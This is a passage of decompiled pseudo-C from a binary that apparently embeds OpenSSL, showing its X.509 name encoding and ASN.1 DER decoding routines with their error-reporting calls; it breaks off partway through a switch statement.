// 42CC91: variable 'v1' is possibly undefined

//----- (0042CDB0) --------------------------------------------------------
int __usercall sub_42CDB0@<eax>(int *a1@<edi>, void **a2)
{
  int v2; // ebx
  int v3; // esi
  int result; // eax
  int v5; // [esp+0h] [ebp-14h]
  int v6; // [esp+10h] [ebp-4h] BYREF

  v2 = 0;
  v3 = 0;
  if ( sub_426A30(v5) <= 0 )
    return v2;
  while ( 1 )
  {
    v6 = sub_426A40(a1, v3);
    result = sub_42F030(&v6, a2, (int)&unk_5057CC, -1, -1);
    if ( result < 0 )
      break;
    v2 += result;
    if ( ++v3 >= sub_426A30((int)a1) )
      return v2;
  }
  return result;
}
// 42CDC6: variable 'v5' is possibly undefined

//----- (0042CE10) --------------------------------------------------------
int __cdecl sub_42CE10(int a1, int *a2)
{
  int result; // eax
  _BYTE *v3; // esi
  int v4; // ebp
  char v5; // al
  char v6; // al
  void *Block; // [esp+0h] [ebp-4h]

  result = (int)sub_4452F0(a2, 0, 0);
  Block = (void *)result;
  if ( result )
  {
    if ( *(_BYTE *)result )
    {
      v3 = (_BYTE *)(result + 1);
      v4 = result + 1;
      while ( 1 )
      {
        if ( *v3 == 47
          && (v5 = v3[1], v5 >= 65)
          && v5 <= 90
          && ((v6 = v3[2], v6 == 61) || v6 >= 65 && v6 <= 90 && v3[3] == 61)
          || !*v3 )
        {
          if ( (_BYTE *)sub_405110(a1, v4, (int)&v3[-v4]) != &v3[-v4] )
            goto LABEL_18;
          v4 = (int)(v3 + 1);
          if ( !*v3 )
            break;
          if ( sub_405110(a1, (int)", ", 2) != 2 )
          {
LABEL_18:
            sub_408310(11, 117, 7, (int)"crypto\\x509\\x_name.c", 548);
            sub_413490(Block);
            return 0;
          }
          if ( !*v3 )
            break;
        }
        ++v3;
      }
      sub_413490(Block);
      return 1;
    }
    else
    {
      sub_413490((void *)result);
      return 1;
    }
  }
  return result;
}

//----- (0042CF20) --------------------------------------------------------
int __usercall sub_42CF20@<eax>(int a1@<esi>)
{
  int v1; // ebp
  int v2; // ebx
  int *v4; // edi
  int *v5; // eax
  void **v6; // eax
  int v7; // eax
  void *v8; // eax
  int *v9; // [esp-10h] [ebp-2Ch]
  int *Block; // [esp+8h] [ebp-14h]
  int v11; // [esp+Ch] [ebp-10h]
  int *v12; // [esp+10h] [ebp-Ch]
  int v13; // [esp+14h] [ebp-8h]
  void *v14; // [esp+18h] [ebp-4h] BYREF

  v1 = 0;
  v12 = 0;
  v2 = 0;
  v11 = -1;
  v13 = 0;
  sub_413490(*(void **)(a1 + 12));
  v9 = *(int **)a1;
  *(_DWORD *)(a1 + 12) = 0;
  if ( sub_426A30((int)v9) )
  {
    Block = sub_426AF0();
    if ( Block )
    {
      if ( sub_426A30(*(_DWORD *)a1) > 0 )
      {
        do
        {
          v4 = (int *)sub_426A40(*(int **)a1, v1);
          if ( v4[2] != v11 )
          {
            v5 = sub_426AF0();
            v12 = v5;
            if ( !v5 || !sub_4269B0(Block, (int)v5) )
              goto LABEL_17;
            v11 = v4[2];
          }
          v2 = sub_42FB20((int)&unk_50579C);
          if ( !v2 )
            goto LABEL_17;
          v6 = sub_439EE0(*v4);
          *(_DWORD *)v2 = v6;
          if ( !v6 || !sub_42CC90(*(int **)(v2 + 4)) || !sub_4269B0(v12, v2) )
            goto LABEL_17;
          v2 = 0;
          ++v1;
        }
        while ( v1 < sub_426A30(*(_DWORD *)a1) );
      }
      v7 = sub_42CDB0(Block, 0);
      if ( v7 >= 0 )
      {
        *(_DWORD *)(a1 + 16) = v7;
        v8 = sub_4133F0(v7);
        v14 = v8;
        if ( v8 )
        {
          *(_DWORD *)(a1 + 12) = v8;
          sub_42CDB0(Block, &v14);
          v13 = 1;
        }
      }
    }
LABEL_17:
    sub_42FEF0(v2, (int)&unk_50579C);
    sub_426C00(Block, (void (__cdecl *)(_DWORD))sub_42CB00);
    return v13;
  }
  else
  {
    *(_DWORD *)(a1 + 16) = 0;
    return 1;
  }
}

//----- (0042D0C0) --------------------------------------------------------
int __cdecl sub_42D0C0(int *a1, const void **a2, int a3, int a4, int a5, int a6, int a7, _BYTE *a8)
{
  _BYTE *v8; // esi
  int v9; // eax
  int result; // eax
  _DWORD *v11; // edi
  int v12; // eax
  void ***v13; // ebp
  int v14; // esi
  void **v15; // edi
  int v16; // ebx
  int v17; // eax
  void *v18; // edx
  void *Block; // [esp+8h] [ebp-Ch] BYREF
  _BYTE *v20; // [esp+Ch] [ebp-8h] BYREF
  void ***v21; // [esp+10h] [ebp-4h] BYREF

  v8 = *a2;
  v9 = a3;
  v20 = *a2;
  Block = 0;
  v21 = 0;
  if ( a3 > 0x100000 )
    v9 = 0x100000;
  result = sub_42E970((int *)&Block, (void **)&v20, v9, (int)&unk_5057FC, a5, a6, a7, a8);
  if ( result > 0 )
  {
    v11 = a1;
    if ( *a1 )
      sub_42CAA0(a1);
    v12 = sub_42CA20(&v21);
    v13 = v21;
    if ( !v12 || !sub_4198C0((int)v21[2], v20 - v8) )
      goto LABEL_15;
    memcpy(v13[2][1], v8, v20 - v8);
    v14 = 0;
    if ( sub_426A30((int)Block) > 0 )
    {
      while ( 1 )
      {
        v15 = (void **)sub_426A40((int *)Block, v14);
        v16 = 0;
        if ( sub_426A30((int)v15) > 0 )
          break;
LABEL_12:
        sub_4269F0(v15);
        sub_426A60((int *)Block, v14++, 0);
        if ( v14 >= sub_426A30((int)Block) )
        {
          v11 = a1;
          goto LABEL_14;
        }
      }
      while ( 1 )
      {
        v17 = sub_426A40((int *)v15, v16);
        *(_DWORD *)(v17 + 8) = v14;
        if ( !sub_4269B0((int *)*v13, v17) )
          break;
        sub_426A60((int *)v15, v16++, 0);
        if ( v16 >= sub_426A30((int)v15) )
          goto LABEL_12;
      }
      sub_426C00(v15, sub_42C950);
      goto LABEL_15;
    }
LABEL_14:
    sub_4269F0((void **)Block);
    Block = 0;
    result = sub_42CF20((int)v13);
    if ( !result )
    {
LABEL_15:
      sub_42FEF0((int)v13, (int)&unk_505834);
      sub_426C00(Block, (void (__cdecl *)(_DWORD))sub_42CAF0);
      sub_408310(13, 158, 58, (int)"crypto\\x509\\x_name.c", 207);
      return 0;
    }
    v13[1] = 0;
    v18 = v20;
    *v11 = v13;
    *a2 = v18;
  }
  return result;
}

//----- (0042D2A0) --------------------------------------------------------
int __cdecl sub_42D2A0(int *a1, void **a2)
{
  int v2; // esi
  int result; // eax
  int v4; // esi
  size_t v5; // ebx

  v2 = *a1;
  if ( !*(_DWORD *)(*a1 + 4) || (result = sub_42CB20(v2), result >= 0) && (result = sub_42CF20(v2), result >= 0) )
  {
    v4 = *(_DWORD *)(v2 + 8);
    v5 = *(_DWORD *)v4;
    if ( a2 )
    {
      memcpy(*a2, *(const void **)(v4 + 4), v5);
      *a2 = (char *)*a2 + v5;
    }
    return v5;
  }
  return result;
}

//----- (0042D2F0) --------------------------------------------------------
int __cdecl sub_42D2F0(unsigned int a1)
{
  if ( a1 > 0x1E )
    return 0;
  else
    return dword_505870[a1];
}
// 505870: using guessed type int dword_505870[32];

//----- (0042D310) --------------------------------------------------------
int __usercall sub_42D310@<eax>(int *a1@<edx>, int a2@<ecx>, size_t a3@<ebx>, void *Src, int a5, _BYTE *a6)
{
  int v6; // eax
  int *v7; // edi
  _DWORD *v8; // ebp
  int (__cdecl *v9)(int *, void *, size_t, int, _BYTE *, int); // eax
  int result; // eax
  int v11; // eax
  int v12; // esi
  int v13; // esi
  _DWORD *v14; // eax
  _BYTE *v15; // ecx
  int *v16; // [esp+8h] [ebp-8h]

  v6 = *(_DWORD *)(a2 + 16);
  v7 = a1;
  v8 = 0;
  v16 = 0;
  if ( v6 )
  {
    v9 = *(int (__cdecl **)(int *, void *, size_t, int, _BYTE *, int))(v6 + 20);
    if ( v9 )
      return v9(a1, Src, a3, a5, a6, a2);
  }
  if ( *(_DWORD *)(a2 + 4) == -4 )
  {
    v8 = (_DWORD *)*a1;
    if ( !*a1 )
    {
      v11 = sub_42C600();
      v8 = (_DWORD *)v11;
      if ( !v11 )
      {
LABEL_17:
        sub_42C610((int)v8);
        if ( v16 )
          *v16 = 0;
        return 0;
      }
      *v7 = v11;
    }
    v12 = a5;
    if ( a5 != *v8 )
      sub_423E40(v8, a5, 0);
    v16 = v7;
    v7 = v8 + 1;
  }
  else
  {
    v12 = a5;
  }
  switch ( v12 )
  {
    case 1:
      if ( a3 != 1 )
      {
        sub_408310(13, 204, 106, (int)"crypto\\asn1\\tasn_dec.c", 800);
        goto LABEL_17;
      }
      *v7 = *(unsigned __int8 *)Src;
      goto LABEL_42;
    case 2:
    case 10:
      if ( !sub_431390(v7, (char **)&Src, a3) )
        goto LABEL_17;
      *(_DWORD *)(*v7 + 4) = v12 | *(_DWORD *)(*v7 + 4) & 0x100;
      goto LABEL_42;
    case 3:
      if ( !sub_437790((size_t **)v7, (unsigned __int8 **)&Src, a3) )
        goto LABEL_17;
      goto LABEL_42;
    case 5:
      if ( a3 )
      {
        sub_408310(13, 204, 144, (int)"crypto\\asn1\\tasn_dec.c", 792);
        goto LABEL_17;
      }
      *v7 = 1;
      goto LABEL_42;
    case 6:
      if ( !sub_422C00((void ***)v7, (_BYTE **)&Src, a3) )
        goto LABEL_17;
      goto LABEL_42;
    default:
      if ( v12 == 30 )
      {
        if ( (a3 & 1) != 0 )
        {
          sub_408310(13, 204, 214, (int)"crypto\\asn1\\tasn_dec.c", 842);
          goto LABEL_17;
        }
      }
      else if ( v12 == 28 && (a3 & 3) != 0 )
      {
        sub_408310(13, 204, 215, (int)"crypto\\asn1\\tasn_dec.c", 847);
        goto LABEL_17;
      }
      v13 = *v7;
      if ( *v7 )
      {
        *(_DWORD *)(v13 + 4) = a5;
      }
      else
      {
        v14 = sub_4329F0(a5);
        v13 = (int)v14;
        if ( !v14 )
        {
          sub_408310(13, 204, 65, (int)"crypto\\asn1\\tasn_dec.c", 854);
          goto LABEL_17;
        }
        *v7 = (int)v14;
      }
      if ( *a6 )
      {
        sub_413490(*(void **)(v13 + 8));
        v15 = a6;
        *(_DWORD *)(v13 + 8) = Src;
        *(_DWORD *)v13 = a3;
        *v15 = 0;
      }
      else if ( !sub_432910(v13, (const char *)Src, a3) )
      {
        sub_408310(13, 204, 65, (int)"crypto\\asn1\\tasn_dec.c", 870);
        sub_432A30((void **)v13);
        *v7 = 0;
        goto LABEL_17;
      }
      v12 = a5;
LABEL_42:
      if ( v8 && v12 == 5 )
        v8[1] = 0;
      result = 1;
      break;
  }
  return result;
}

//----- (0042D5A0) --------------------------------------------------------
int __cdecl sub_42D5A0(int a1)
{
  _DWORD *v1; // ecx
  _BYTE *v2; // eax

  if ( a1 < 2 )
    return 0;
  v2 = (_BYTE *)*v1;
  if ( *(_BYTE *)*v1 || v2[1] )
    return 0;
  *v1 = v2 + 2;
  return 1;
}
// 42D5A7: variable 'v1' is possibly undefined

//----- (0042D5D0) --------------------------------------------------------
int __cdecl sub_42D5D0(
        unsigned int *a1,
        _DWORD *a2,
        _BYTE *a3,
        _BYTE *a4,
        _BYTE *a5,
        int *a6,
        int a7,
        int a8,
        int a9,
        char a10,
        int a11)
{
  int v11; // ecx
  int v12; // esi
  int v13; // edi
  int v14; // ecx
  unsigned int v15; // ebp
  int v16; // eax
  int v17; // edx
  int v18; // edx
  int v20; // [esp+10h] [ebp-Ch] BYREF
  int v21; // [esp+14h] [ebp-8h] BYREF
  unsigned int v22; // [esp+18h] [ebp-4h] BYREF

  v11 = *a6;
  v12 = a11;
  a11 = v11;
  v13 = v11;
  if ( v12 && *(_BYTE *)v12 )
  {
    v14 = *(_DWORD *)(v12 + 20) + v11;
    v15 = *(_DWORD *)(v12 + 8);
    v16 = *(_DWORD *)(v12 + 4);
    v20 = *(_DWORD *)(v12 + 16);
    v17 = *(_DWORD *)(v12 + 12);
    v22 = v15;
    v21 = v17;
    a11 = v14;
  }
  else
  {
    v16 = sub_432B70((_BYTE **)&a11, &v22, &v21, &v20, a7);
    v15 = v22;
    if ( v12 )
    {
      v18 = v21;
      *(_DWORD *)(v12 + 16) = v20;
      v14 = a11;
      *(_DWORD *)(v12 + 12) = v18;
      *(_DWORD *)(v12 + 4) = v16;
      *(_DWORD *)(v12 + 8) = v15;
      *(_DWORD *)(v12 + 20) = v14 - v13;
      *(_BYTE *)v12 = 1;
      if ( (v16 & 0x81) == 0 && (int)(v15 + v14 - v13) > a7 )
      {
        sub_408310(13, 104, 155, (int)"crypto\\asn1\\tasn_dec.c", 1092);
        *(_BYTE *)v12 = 0;
        return 0;
      }
    }
    else
    {
      v14 = a11;
    }
  }
  if ( (v16 & 0x80u) != 0 )
  {
    sub_408310(13, 104, 102, (int)"crypto\\asn1\\tasn_dec.c", 1100);
    if ( v12 )
      *(_BYTE *)v12 = 0;
    return 0;
  }
  if ( a8 < 0 )
    goto LABEL_18;
  if ( a8 == v21 && a9 == v20 )
  {
    if ( v12 )
      *(_BYTE *)v12 = 0;
LABEL_18:
    if ( (v16 & 1) != 0 )
      v15 = a7 + v13 - v14;
    if ( a4 )
      *a4 = v16 & 1;
    if ( a5 )
      *a5 = v16 & 0x20;
    if ( a1 )
      *a1 = v15;
    if ( a3 )
      *a3 = v20;
    if ( a2 )
      *a2 = v21;
    *a6 = v14;
    return 1;
  }
  if ( a10 )
    return -1;
  if ( v12 )
    *(_BYTE *)v12 = 0;
  sub_408310(13, 104, 168, (int)"crypto\\asn1\\tasn_dec.c", 1112);
  return 0;
}

//----- (0042D790) --------------------------------------------------------
int __usercall sub_42D790@<eax>(int a1@<edx>, char a2@<cl>, int a3@<ebx>, int **a4, _BYTE **a5, _DWORD *a6)
{
  int **v6; // ebp
  _DWORD *v7; // esi
  int result; // eax
  int v9; // eax
  _BYTE *v10; // edi
  int v11; // esi
  int v12; // esi
  _DWORD *v13; // [esp-10h] [ebp-24h]
  char v14; // [esp+Bh] [ebp-9h] BYREF
  _BYTE *v15; // [esp+Ch] [ebp-8h] BYREF
  int v16; // [esp+10h] [ebp-4h] BYREF

  v6 = a4;
  v7 = a6;
  if ( !a4 )
    return 0;
  v9 = *a6;
  v15 = *a5;
  if ( (v9 & 0x10) == 0 )
    return sub_42E690(a4, a5, a1, a6, a2, a3);
  result = sub_42D5D0((unsigned int *)&v16, 0, 0, &v14, &a4, (int *)&v15, a1, a6[1], v9 & 0xC0, a2, a3);
  v10 = v15;
  if ( !result )
  {
    sub_408310(13, 132, 58, (int)"crypto\\asn1\\tasn_dec.c", 448);
    return 0;
  }
  if ( result == -1 )
    return result;
  if ( !(_BYTE)a4 )
  {
    sub_408310(13, 132, 120, (int)"crypto\\asn1\\tasn_dec.c", 454);
    return 0;
  }
  v13 = v7;
  v11 = v16;
  if ( !sub_42E690(v6, &v15, v16, v13, 0, a3) )
  {
    sub_408310(13, 132, 58, (int)"crypto\\asn1\\tasn_dec.c", 460);
    return 0;
  }
  v12 = v10 - v15 + v11;
  if ( v14 )
  {
    if ( !sub_42D5A0(v12) )
    {
      sub_408310(13, 132, 137, (int)"crypto\\asn1\\tasn_dec.c", 468);
      return 0;
    }
  }
  else if ( v12 )
  {
    sub_408310(13, 132, 119, (int)"crypto\\asn1\\tasn_dec.c", 477);
    return 0;
  }
  *a5 = v15;
  return 1;
}

//----- (0042D8E0) --------------------------------------------------------
int __cdecl sub_42D8E0(_BYTE **a1, char a2)
{
  int v2; // ecx
  _BYTE *v3; // esi
  int v4; // edi
  int v6; // ebp
  _BYTE *v7; // ebx
  char v8; // al
  _BYTE *v9; // [esp+8h] [ebp-10h] BYREF
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  int v11; // [esp+10h] [ebp-8h] BYREF
  int v12; // [esp+14h] [ebp-4h] BYREF

  v3 = *a1;
  v4 = v2;
  if ( a2 )
  {
    v6 = 1;
    if ( v2 <= 0 )
    {
LABEL_19:
      sub_408310(13, 190, 137, (int)"crypto\\asn1\\tasn_dec.c", 943);
      return 0;
    }
    else
    {
      do
      {
        if ( v4 < 2 || *v3 || v3[1] )
        {
          v7 = v3;
          v9 = v3;
          v8 = sub_432B70(&v9, (unsigned int *)&v10, &v12, &v11, v4);
          if ( v8 < 0 )
          {
            sub_408310(13, 104, 102, (int)"crypto\\asn1\\tasn_dec.c", 1100);
            sub_408310(13, 190, 58, (int)"crypto\\asn1\\tasn_dec.c", 928);
            return 0;
          }
          if ( (v8 & 1) != 0 )
            v10 = v4 + v3 - v9;
          v3 = v9;
          if ( (v8 & 1) != 0 )
          {
            if ( v6 == -1 )
            {
              sub_408310(13, 190, 58, (int)"crypto\\asn1\\tasn_dec.c", 933);
              return 0;
            }
            ++v6;
          }
          else
          {
            v3 = &v9[v10];
          }
          v4 += v7 - v3;
        }
        else
        {
          v3 += 2;
          if ( !--v6 )
            goto LABEL_23;
          v4 -= 2;
        }
      }
      while ( v4 > 0 );
      if ( v6 )
        goto LABEL_19;
LABEL_23:
      *a1 = v3;
      return 1;
    }
  }
  else
  {
    *a1 = &v3[v2];
    return 1;
  }
}
// 42D8F7: variable 'v2' is possibly undefined

//----- (0042DA20) --------------------------------------------------------
int __cdecl sub_42DA20(int *a1, void **a2, int a3, char a4, int a5, int a6, int a7)
{
  int *v7; // ebx
  _BYTE *v8; // eax
  int v10; // ebp
  _BYTE *v11; // esi
  char v12; // al
  size_t v13; // esi
  char v14; // dl
  bool v15; // zf
  int v16; // edi
  void *Src; // [esp+8h] [ebp-18h] BYREF
  size_t v18; // [esp+Ch] [ebp-14h] BYREF
  int v19; // [esp+10h] [ebp-10h] BYREF
  int v20; // [esp+14h] [ebp-Ch] BYREF
  int v21; // [esp+18h] [ebp-8h]
  _BYTE *v22; // [esp+1Ch] [ebp-4h]

  a4 &= 1u;
  v7 = a1;
  v8 = *a2;
  Src = *a2;
  if ( a1 || a4 )
  {
    v10 = a3;
    if ( a3 <= 0 )
    {
LABEL_25:
      if ( a4 )
      {
        sub_408310(13, 106, 137, (int)"crypto\\asn1\\tasn_dec.c", 1016);
        return 0;
      }
      else
      {
LABEL_35:
        *a2 = v8;
        return 1;
      }
    }
    else
    {
      while ( 1 )
      {
        v22 = v8;
        if ( v10 >= 2 && !*v8 && !v8[1] )
          break;
        a1 = (int *)v8;
        v11 = v8;
        v12 = sub_432B70((_BYTE **)&a1, &v18, &v19, &v20, v10);
        if ( v12 < 0 )
        {
          sub_408310(13, 104, 102, (int)"crypto\\asn1\\tasn_dec.c", 1100);
LABEL_31:
          sub_408310(13, 106, 58, (int)"crypto\\asn1\\tasn_dec.c", 999);
          return 0;
        }
        if ( a5 >= 0 && (a5 != v19 || a6 != v20) )
        {
          sub_408310(13, 104, 168, (int)"crypto\\asn1\\tasn_dec.c", 1112);
          goto LABEL_31;
        }
        if ( (v12 & 1) != 0 )
        {
          v13 = v10 + v11 - (_BYTE *)a1;
          v18 = v13;
        }
        else
        {
          v13 = v18;
        }
        v14 = v12 & 1;
        v15 = (v12 & 0x20) == 0;
        v8 = a1;
        LOBYTE(v21) = v14;
        Src = a1;
        if ( v15 )
        {
          if ( v13 )
          {
            if ( v7 )
            {
              v16 = *v7;
              if ( !sub_4199A0((int)v7, v13 + *v7) )
              {
                sub_408310(13, 140, 65, (int)"crypto\\asn1\\tasn_dec.c", 1029);
                return 0;
              }
              memcpy((void *)(v16 + v7[1]), Src, v13);
              v8 = Src;
            }
            v8 += v13;
            Src = v8;
          }
        }
        else
        {
          if ( a7 >= 5 )
          {
            sub_408310(13, 106, 197, (int)"crypto\\asn1\\tasn_dec.c", 1006);
            return 0;
          }
          if ( !sub_42DA20(v7, &Src, v13, v21, a5, a6, a7 + 1) )
            return 0;
          v8 = Src;
        }
        v10 += v22 - v8;
        if ( v10 <= 0 )
          goto LABEL_25;
      }
      v8 += 2;
      Src = v8;
      if ( a4 )
        goto LABEL_35;
      sub_408310(13, 106, 159, (int)"crypto\\asn1\\tasn_dec.c", 990);
      return 0;
    }
  }
  else
  {
    *a2 = &v8[a3];
    return 1;
  }
}

//----- (0042DC90) --------------------------------------------------------
int __cdecl sub_42DC90(int *a1, void **a2, int a3, int a4, int a5, char a6, _BYTE *a7)
{
  int v7; // ecx
  int v8; // esi
  int result; // eax
  int v10; // ebx
  void **v11; // edi
  int v12; // eax
  char *v13; // esi
  char *v14; // ebp
  void *v15; // edi
  char v16; // [esp+Ah] [ebp-22h] BYREF
  char v17; // [esp+Bh] [ebp-21h] BYREF
  char *v18; // [esp+Ch] [ebp-20h] BYREF
  int v19; // [esp+10h] [ebp-1Ch] BYREF
  int v20; // [esp+14h] [ebp-18h] BYREF
  int v21; // [esp+18h] [ebp-14h]
  char *v22; // [esp+1Ch] [ebp-10h] BYREF
  void *Block; // [esp+20h] [ebp-Ch]
  int v24; // [esp+24h] [ebp-8h]
  int v25; // [esp+28h] [ebp-4h]

  v8 = v7;
  v16 = 0;
  v22 = 0;
  Block = 0;
  v24 = 0;
  v25 = 0;
  if ( !a1 )
  {
    sub_408310(13, 108, 125, (int)"crypto\\asn1\\tasn_dec.c", 635);
    return 0;
  }
  if ( *(_BYTE *)a4 == 5 )
  {
    v10 = v7;
    v8 = -1;
  }
  else
  {
    v10 = *(_DWORD *)(a4 + 4);
  }
  v19 = v10;
  if ( v10 == -4 )
  {
    if ( v8 >= 0 )
    {
      sub_408310(13, 108, 127, (int)"crypto\\asn1\\tasn_dec.c", 649);
      return 0;
    }
    if ( a6 )
    {
      sub_408310(13, 108, 126, (int)"crypto\\asn1\\tasn_dec.c", 654);
      return 0;
    }
    v11 = a2;
    v18 = (char *)*a2;
    if ( !sub_42D5D0(0, &v19, &v17, 0, 0, (int *)&v18, a3, -1, 0, 0, (int)a7) )
    {
      sub_408310(13, 108, 58, (int)"crypto\\asn1\\tasn_dec.c", 661);
      return 0;
    }
    if ( v17 )
      v10 = -3;
    else
      v10 = v19;
  }
  else
  {
    v11 = a2;
  }
  if ( v8 == -1 )
  {
    v8 = v10;
    v12 = 0;
  }
  else
  {
    v12 = a5;
  }
  v18 = (char *)*v11;
  result = sub_42D5D0((unsigned int *)&v19, 0, 0, &v20, &v17, (int *)&v18, a3, v8, v12, a6, (int)a7);
  if ( !result )
  {
    sub_408310(13, 108, 58, (int)"crypto\\asn1\\tasn_dec.c", 676);
    return 0;
  }
  if ( result != -1 )
  {
    v21 = 0;
    if ( v10 == 16 || v10 == 17 )
    {
      if ( !v17 )
      {
        sub_408310(13, 108, 156, (int)"crypto\\asn1\\tasn_dec.c", 694);
        return 0;
      }
    }
    else
    {
      if ( v10 != -3 )
      {
        if ( v17 )
        {
          if ( v10 == 5 || v10 == 1 || v10 == 6 || v10 == 2 || v10 == 10 )
          {
            sub_408310(13, 108, 195, (int)"crypto\\asn1\\tasn_dec.c", 712);
            return 0;
          }
          v16 = 1;
          if ( !sub_42DA20((int *)&v22, (void **)&v18, v19, v20, -1, 0, 0) )
            goto LABEL_50;
          v13 = v22;
          if ( !sub_4199A0((int)&v22, (unsigned int)(v22 + 1)) )
          {
            sub_408310(13, 108, 65, (int)"crypto\\asn1\\tasn_dec.c", 730);
LABEL_50:
            if ( v16 )
              sub_413490(Block);
            return v21;
          }
          v14 = v18;
          *((_BYTE *)Block + (_DWORD)v13) = 0;
          v15 = Block;
        }
        else
        {
          v13 = (char *)v19;
          v15 = v18;
          v14 = &v18[v19];
        }
LABEL_48:
        if ( sub_42D310(a1, a4, (size_t)v13, v15, v10, &v16) )
        {
          *a2 = v14;
          v21 = 1;
        }
        goto LABEL_50;
      }
      if ( a7 )
        *a7 = 0;
    }
    v15 = *v11;
    if ( (_BYTE)v20 )
    {
      if ( !sub_42D8E0(&v18, v20) )
        goto LABEL_50;
      v14 = v18;
      v13 = (char *)(v18 - (_BYTE *)v15);
    }
    else
    {
      v13 = &v18[v19 - (_DWORD)v15];
      v14 = &v18[v19];
    }
    goto LABEL_48;
  }
  return result;
}
// 42DF17: conditional instruction was optimized away because ebx.4 is in (10..11)
// 42DCA0: variable 'v7' is possibly undefined

//----- (0042DFE0) --------------------------------------------------------
int __usercall sub_42DFE0@<eax>(
        int a1@<ecx>,
        int *a2@<edi>,
        int a3@<esi>,
        void **a4,
        int a5,
        int a6,
        int a7,
        _BYTE *a8)
{
  int v8; // edx
  int v9; // eax
  int v10; // ebp
  _DWORD *v11; // edx
  int v13; // eax
  int *v14; // ebx
  int *v15; // eax
  bool v16; // cc
  int *v17; // ebp
  int **v18; // eax
  int v19; // ebx
  int *v20; // ebx
  int v21; // eax
  int v22; // ebx
  _DWORD *v23; // ebx
  int *v24; // eax
  int *v25; // ebp
  int *v26; // eax
  int v27; // edx
  int *v28; // eax
  int *v29; // ebp
  _BYTE *v30; // ebx
  int v31; // edx
  char v32; // cl
  int v33; // eax
  int v34; // edx
  int *v35; // eax
  int *v36; // eax
  char v37; // [esp+9h] [ebp-1Bh] BYREF
  char v38; // [esp+Ah] [ebp-1Ah] BYREF
  char v39; // [esp+Bh] [ebp-19h] BYREF
  _BYTE *v40; // [esp+Ch] [ebp-18h] BYREF
  int v41; // [esp+10h] [ebp-14h]
  int v42; // [esp+14h] [ebp-10h]
  int (__cdecl *v43)(int, int *, int, _DWORD); // [esp+18h] [ebp-Ch]
  int **v44; // [esp+1Ch] [ebp-8h] BYREF
  _BYTE *v45; // [esp+20h] [ebp-4h]

  v8 = *(_DWORD *)(a3 + 16);
  v9 = a6;
  v10 = a5;
  v42 = v8;
  v40 = 0;
  if ( !a2 )
    return 0;
  if ( !v8 || (v43 = *(int (__cdecl **)(int, int *, int, _DWORD))(v8 + 16)) == 0 )
    v43 = 0;
  switch ( *(_BYTE *)a3 )
  {
    case 0:
      v11 = *(_DWORD **)(a3 + 8);
      if ( !v11 )
        return sub_42DC90(a2, a4, a5, a3, a6, a7, a8);
      if ( a1 == -1 && !(_BYTE)a7 )
        return sub_42D790(a5, 0, (int)a8, (int **)a2, (_BYTE **)a4, v11);
      sub_408310(13, 120, 170, (int)"crypto\\asn1\\tasn_dec.c", 159);
      goto LABEL_11;
    case 1:
    case 6:
      v40 = *a4;
      if ( a1 == -1 )
      {
        a1 = 16;
        v9 = 0;
      }
      v21 = sub_42D5D0((unsigned int *)&a5, 0, 0, &v37, &v39, (int *)&v40, a5, a1, v9, a7, (int)a8);
      if ( !v21 )
      {
        sub_408310(13, 120, 58, (int)"crypto\\asn1\\tasn_dec.c", 274);
        goto LABEL_11;
      }
      if ( v21 == -1 )
        return -1;
      if ( v42 && (*(_BYTE *)(v42 + 4) & 4) != 0 )
      {
        v22 = (_BYTE *)*a4 - v40;
        v38 = 1;
        a5 = v10 + v22;
      }
      else
      {
        v38 = v37;
      }
      if ( !v39 )
      {
        sub_408310(13, 120, 149, (int)"crypto\\asn1\\tasn_dec.c", 286);
        goto LABEL_11;
      }
      if ( !*a2 && !sub_42FA40(a2, a3) )
      {
        sub_408310(13, 120, 58, (int)"crypto\\asn1\\tasn_dec.c", 291);
        goto LABEL_11;
      }
      if ( v43 && !v43(4, a2, a3, 0) )
        goto LABEL_100;
      v16 = *(_DWORD *)(a3 + 12) <= 0;
      v23 = *(_DWORD **)(a3 + 8);
      v41 = 0;
      if ( !v16 )
      {
        do
        {
          if ( (*v23 & 0x300) != 0 )
          {
            v24 = sub_445930(a2, (int)v23, 0);
            v25 = v24;
            if ( v24 )
            {
              v26 = (int *)sub_445920(a2, (int)v24);
              sub_42FE30(v26, v25);
            }
          }
          v23 += 5;
          v16 = ++v41 < *(_DWORD *)(a3 + 12);
        }
        while ( v16 );
      }
      v16 = *(_DWORD *)(a3 + 12) <= 0;
      v27 = *(_DWORD *)(a3 + 8);
      v41 = 0;
      v42 = v27;
      if ( v16 )
        goto LABEL_80;
      while ( 1 )
      {
        v28 = sub_445930(a2, v42, 1);
        v29 = v28;
        if ( !v28 )
          goto LABEL_11;
        v44 = (int **)sub_445920(a2, (int)v28);
        if ( !a5 )
          goto LABEL_80;
        v30 = v40;
        v45 = v40;
        if ( sub_42D5A0(a5) )
          break;
        if ( v41 == *(_DWORD *)(a3 + 12) - 1 )
          v32 = 0;
        else
          v32 = *(_BYTE *)v29 & 1;
        v33 = sub_42D790(a5, v32, (int)a8, v44, &v40, v29);
        if ( !v33 )
        {
          v20 = v29;
          goto LABEL_41;
        }
        if ( v33 == -1 )
          sub_42FE30((int *)v44, v29);
        else
          a5 += v45 - v40;
        v42 += 20;
        v16 = ++v41 < *(_DWORD *)(a3 + 12);
        if ( !v16 )
        {
LABEL_80:
          v34 = a5;
          if ( v37 )
          {
            if ( a5 < 2 || *v40 || v40[1] )
            {
              sub_408310(13, 120, 137, (int)"crypto\\asn1\\tasn_dec.c", 364);
              goto LABEL_11;
            }
            v40 += 2;
          }
          goto LABEL_85;
        }
      }
      if ( !v37 )
      {
        sub_408310(13, 120, 159, (int)"crypto\\asn1\\tasn_dec.c", 325);
        goto LABEL_11;
      }
      v34 = v30 - v40 + v31;
LABEL_85:
      if ( !v38 && v34 )
      {
        sub_408310(13, 120, 148, (int)"crypto\\asn1\\tasn_dec.c", 369);
        goto LABEL_11;
      }
      if ( v41 < *(_DWORD *)(a3 + 12) )
      {
        do
        {
          v35 = sub_445930(a2, v42, 1);
          v20 = v35;
          if ( !v35 )
            goto LABEL_11;
          if ( (*(_BYTE *)v35 & 1) == 0 )
          {
            sub_408310(13, 120, 121, (int)"crypto\\asn1\\tasn_dec.c", 389);
            goto LABEL_41;
          }
          v36 = (int *)sub_445920(a2, (int)v35);
          sub_42FE30(v36, v20);
          v42 += 20;
          v16 = ++v41 < *(_DWORD *)(a3 + 12);
        }
        while ( v16 );
      }
      if ( sub_445820(a2, *a4, v40 - (_BYTE *)*a4, a3) && (!v43 || v43(5, a2, a3, 0)) )
      {
        *a4 = v40;
        return 1;
      }
      goto LABEL_100;
    case 2:
